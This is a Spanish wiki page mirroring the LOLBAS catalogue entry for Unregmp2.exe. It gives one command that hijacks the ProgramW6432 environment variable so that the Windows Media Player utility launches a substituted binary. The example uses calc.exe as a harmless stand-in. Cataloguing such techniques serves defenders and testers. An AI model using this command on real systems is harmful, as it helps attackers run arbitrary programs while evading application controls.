# LOLBAS: Unregmp2.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Microsoft Windows Media Player Setup Utility

## Comandos

### Proxy execution of binary

Execute · priv: User · T1202

```cmd
rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
```

Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.

